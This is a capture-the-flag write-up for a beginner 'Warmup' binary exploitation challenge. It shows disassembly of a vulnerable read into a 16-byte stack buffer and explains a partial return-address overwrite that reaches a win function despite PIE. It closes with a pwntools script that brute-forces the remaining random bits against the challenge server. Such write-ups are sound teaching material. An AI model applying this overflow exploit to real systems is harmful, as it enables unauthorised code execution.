# Warmup

```
score: 50
solved: xx
difficulty: easy
tags: pwn, bof
```

# Challenge

Checksec's result:
<pre>Canary                        : <font color="#CC0000"><b>✘ </b></font>
NX                            : <font color="#4E9A06"><b>✓ </b></font>
PIE                           : <font color="#4E9A06"><b>✓ </b></font>
Fortify                       : <font color="#CC0000"><b>✘ </b></font>
RelRO                         : <font color="#4E9A06">Full</font>
</pre>

Having `main` function:
<pre>   <font color="#3465A4">0x00000000000011ce</font> &lt;+0&gt;:	endbr64 
   <font color="#3465A4">0x00000000000011d2</font> &lt;+4&gt;:	push   rbp
   <font color="#3465A4">0x00000000000011d3</font> &lt;+5&gt;:	mov    rbp,rsp
   <font color="#3465A4">0x00000000000011d6</font> &lt;+8&gt;:	mov    edi,0x3c
   <font color="#3465A4">0x00000000000011db</font> &lt;+13&gt;:	call   <font color="#3465A4">0x1090</font> &lt;<font color="#C4A000">alarm@plt</font>&gt;
   <font color="#3465A4">0x00000000000011e0</font> &lt;+18&gt;:	mov    rax,QWORD PTR [rip+0x2e29]        # <font color="#3465A4">0x4010</font> &lt;<font color="#C4A000">stdout@@GLIBC_2.2.5</font>&gt;
   <font color="#3465A4">0x00000000000011e7</font> &lt;+25&gt;:	mov    esi,0x0
   <font color="#3465A4">0x00000000000011ec</font> &lt;+30&gt;:	mov    rdi,rax
   <font color="#3465A4">0x00000000000011ef</font> &lt;+33&gt;:	call   <font color="#3465A4">0x1080</font> &lt;<font color="#C4A000">setbuf@plt</font>&gt;
   <font color="#3465A4">0x00000000000011f4</font> &lt;+38&gt;:	mov    rax,QWORD PTR [rip+0x2e25]        # <font color="#3465A4">0x4020</font> &lt;<font color="#C4A000">stdin@@GLIBC_2.2.5</font>&gt;
   <font color="#3465A4">0x00000000000011fb</font> &lt;+45&gt;:	mov    esi,0x0
   <font color="#3465A4">0x0000000000001200</font> &lt;+50&gt;:	mov    rdi,rax
   <font color="#3465A4">0x0000000000001203</font> &lt;+53&gt;:	call   <font color="#3465A4">0x1080</font> &lt;<font color="#C4A000">setbuf@plt</font>&gt;
   <font color="#3465A4">0x0000000000001208</font> &lt;+58&gt;:	mov    eax,0x0
   <font color="#3465A4">0x000000000000120d</font> &lt;+63&gt;:	call   <font color="#3465A4">0x11a9</font> &lt;<font color="#C4A000">vuln</font>&gt;
   <font color="#3465A4">0x0000000000001212</font> &lt;+68&gt;:	mov    eax,0x0
   <font color="#3465A4">0x0000000000001217</font> &lt;+73&gt;:	pop    rbp
   <font color="#3465A4">0x0000000000001218</font> &lt;+74&gt;:	ret   </pre>

and `vuln` function:
<pre>   <font color="#3465A4">0x00000000000011a9</font> &lt;+0&gt;:	endbr64 
   <font color="#3465A4">0x00000000000011ad</font> &lt;+4&gt;:	push   rbp
   <font color="#3465A4">0x00000000000011ae</font> &lt;+5&gt;:	mov    rbp,rsp
   <font color="#3465A4">0x00000000000011b1</font> &lt;+8&gt;:	sub    rsp,0x10
   <font color="#3465A4">0x00000000000011b5</font> &lt;+12&gt;:	lea    rax,[rbp-0x10]
   <font color="#3465A4">0x00000000000011b9</font> &lt;+16&gt;:	mov    edx,0x100
   <font color="#3465A4">0x00000000000011be</font> &lt;+21&gt;:	mov    rsi,rax
   <font color="#3465A4">0x00000000000011c1</font> &lt;+24&gt;:	mov    edi,0x0
   <font color="#3465A4">0x00000000000011c6</font> &lt;+29&gt;:	call   <font color="#3465A4">0x10a0</font> &lt;<font color="#C4A000">read@plt</font>&gt;
   <font color="#3465A4">0x00000000000011cb</font> &lt;+34&gt;:	nop
   <font color="#3465A4">0x00000000000011cc</font> &lt;+35&gt;:	leave  
   <font color="#3465A4">0x00000000000011cd</font> &lt;+36&gt;:	ret  </pre>

# Got the flag

Review the functions in bin:
<pre><font color="#CC0000"><b>gef➤  </b></font>info functions 
All defined functions:

Non-debugging symbols:
<font color="#3465A4">0x0000000000001000</font>  <font color="#C4A000">_init</font>
<font color="#3465A4">0x0000000000001070</font>  <font color="#C4A000">__cxa_finalize@plt</font>
<font color="#3465A4">0x0000000000001080</font>  <font color="#C4A000">setbuf@plt</font>
<font color="#3465A4">0x0000000000001090</font>  <font color="#C4A000">alarm@plt</font>
<font color="#3465A4">0x00000000000010a0</font>  <font color="#C4A000">read@plt</font>
<font color="#3465A4">0x00000000000010b0</font>  <font color="#C4A000">execl@plt</font>
<font color="#3465A4">0x00000000000010c0</font>  <font color="#C4A000">_start</font>
<font color="#3465A4">0x00000000000010f0</font>  <font color="#C4A000">deregister_tm_clones</font>
<font color="#3465A4">0x0000000000001120</font>  <font color="#C4A000">register_tm_clones</font>
<font color="#3465A4">0x0000000000001160</font>  <font color="#C4A000">__do_global_dtors_aux</font>
<font color="#3465A4">0x00000000000011a0</font>  <font color="#C4A000">frame_dummy</font>
<font color="#3465A4">0x00000000000011a9</font>  <font color="#C4A000">vuln</font>
<font color="#3465A4">0x00000000000011ce</font>  <font color="#C4A000">main</font>
<font color="#3465A4">0x0000000000001219</font>  <font color="#C4A000">win</font>
<font color="#3465A4">0x0000000000001250</font>  <font color="#C4A000">__libc_csu_init</font>
<font color="#3465A4">0x00000000000012c0</font>  <font color="#C4A000">__libc_csu_fini</font>
<font color="#3465A4">0x00000000000012c8</font>  <font color="#C4A000">_fini</font>
</pre>

Easy to detect a bof vulnerability in `vuln` function. We have `win` function, so our aim is override `return address` of `vuln` to `win`.

At here, `PIE` is enable so we can not override the whole address. The trick at here is just override as least as possible. We can see `PIE` is not generate 12 lowest bits in x64 CPU. It means the address base have format `0xaaaaaaaaaa000`. Therefore, we will try override 2 bytes (16 bits). Because haveing 4 bits randon remaining, we will try and try again until our 4 bits is matched.

# Exploit code

```py
from pwn import *
import time

elf = ELF("./chal")
# p = process(elf.path)
p = remote("warmup1.ctf.maplebacon.org",1337)

payload = b"A"*0x18
payload += b"\x19\x02"
p.send(payload)
time.sleep(0.5)
x = p.recv()
# x = p.poll(False)
# while x == -11:
while b"Segmentation fault" in x:
    p.close()
    # p = process(elf.path)
    p = remote("warmup1.ctf.maplebacon.org",1337)
    p.send(payload)
    time.sleep(0.5)
    x = p.recv()
print(x)
p.interactive()
```
